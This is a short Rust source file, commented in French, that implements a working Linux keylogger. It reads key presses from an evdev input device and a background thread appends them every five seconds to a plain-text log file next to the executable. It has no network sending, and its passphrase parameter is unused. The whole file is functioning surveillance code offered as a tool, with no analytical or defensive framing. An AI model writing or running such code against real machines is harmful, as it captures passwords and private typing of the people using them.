use evdev::{Device, InputEventKind};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use std::fs::{self, OpenOptions};
use std::io::Write;

fn write_plain_log(data: &str) {
    let log_path = std::env::current_exe()
        .unwrap()
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .join("logs")
        .join("log.txt");

    std::fs::create_dir_all(log_path.parent().unwrap()).unwrap();

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .unwrap();

    writeln!(file, "{}", data).unwrap();
}

pub fn start_keylogger(device_path: &str, _passphrase: &str) {
    let mut dev = Device::open(device_path).expect("Impossible d'ouvrir le device");

    let buffer = Arc::new(Mutex::new(String::new()));
    let buffer_clone = Arc::clone(&buffer);

    // Thread secondaire : toutes les 5 sec on écrit les logs
    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(5));
        let mut buf = buffer_clone.lock().unwrap();
        if !buf.is_empty() {
            write_plain_log(&buf);
            buf.clear();
        }
    });

    println!("[*] Keylogger démarré sur {}", device_path);

    // Thread principal : écoute les frappes
    loop {
        for ev in dev.fetch_events().unwrap() {
            if let InputEventKind::Key(key) = ev.kind() {
                if ev.value() == 1 {
                    let mut buf = buffer.lock().unwrap();
                    buf.push_str(&format!("{:?} ", key));
                }
            }
        }
        thread::sleep(Duration::from_millis(10));
    }
}
